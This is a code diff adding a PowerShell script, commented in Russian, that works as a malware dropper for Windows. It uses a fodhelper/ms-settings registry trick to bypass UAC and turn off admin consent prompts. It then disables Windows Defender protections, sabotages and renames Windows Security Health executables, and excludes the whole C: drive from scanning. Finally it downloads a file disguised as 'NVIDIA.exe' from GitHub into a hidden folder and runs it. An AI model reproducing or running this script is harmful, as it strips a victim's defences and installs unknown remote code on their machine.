@@ -1,0 +1,67 @@
+# Проверка архитектуры процессора и выполнение соответствующего действия
+if ($env:PROCESSOR_ARCHITECTURE -eq "amd64") {
+    $null = Test-Path "$env:SYSTEMROOT\SysWOW64\cacls.exe" -and & "$env:SYSTEMROOT\SysWOW64\cacls.exe" "$env:SYSTEMROOT\SysWOW64\config\system"
+} else {
+    $null = Test-Path "$env:SYSTEMROOT\system32\cacls.exe" -and & "$env:SYSTEMROOT\system32\cacls.exe" "$env:SYSTEMROOT\system32\config\system"
+}
+
+# Если ошибка, инициируем запрос UAC
+if ($LASTEXITCODE -ne 0) {
+    Set-RegistryKeysForUACPrompt
+    Start-Process "fodhelper.exe"
+    Start-Process PowerShell -ArgumentList "-Command `\"Start-Process '$($MyInvocation.MyCommand.Path)' -Verb RunAs`\""
+    exit
+} else {
+    # Если есть админские права, продолжаем выполнение
+    ExecuteAdminTasks
+}
+
+# Функция для настройки реестра и запуска UAC запроса
+function Set-RegistryKeysForUACPrompt {
+    # Добавление ключей реестра для обхода UAC
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
+    Set-ItemProperty -Path "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value " "
+}
+
+# Функция для выполнения административных задач
+function ExecuteAdminTasks {
+    # Переход в рабочую директорию
+    Push-Location $PSScriptRoot
+
+    # Выполнение команд в реестре для отключения защиты Windows Defender
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord
+
+    # Удаление элемента из реестра
+    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth"
+
+    # Изменение прав на файлы и переименование
+    Take-OwnershipAndRename "C:\Windows\System32\SecurityHealthService.exe" "Celka.sej"
+    Take-OwnershipAndRename "C:\Windows\System32\SecurityHealthSystray.exe" "Nurik.nes"
+
+    # Остановка процесса
+    Stop-Process -Name "SecurityHealthSystray" -Force
+
+    # Добавление пути в исключения Windows Defender
+    Add-MpPreference -ExclusionPath "C:\"
+
+    # Ожидание
+    Start-Sleep -Seconds 10
+
+    # Создание скрытой директории и скачивание файла
+    New-Item -Path "C:\ProgramData\QQQ" -ItemType Directory -Force
+    Set-ItemProperty -Path "C:\ProgramData\QQQ" -Name "Attributes" -Value "Hidden"
+    Invoke-WebRequest -Uri "https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIA.exe" -OutFile "C:\ProgramData\QQQ\NVIDIA.exe"
+
+    # Запуск скачанного файла
+    Start-Process "C:\ProgramData\QQQ\NVIDIA.exe"
+}
+
+# Функция для взятия на себя прав на файл и его переименования
+function Take-OwnershipAndRename($filePath, $newName) {
+    takeown /f $filePath
+    icacls $filePath /grant:r "$env:USERDOMAIN\$env:USERNAME":F /c
+    Rename-Item -Path $filePath -NewName $newName
+}
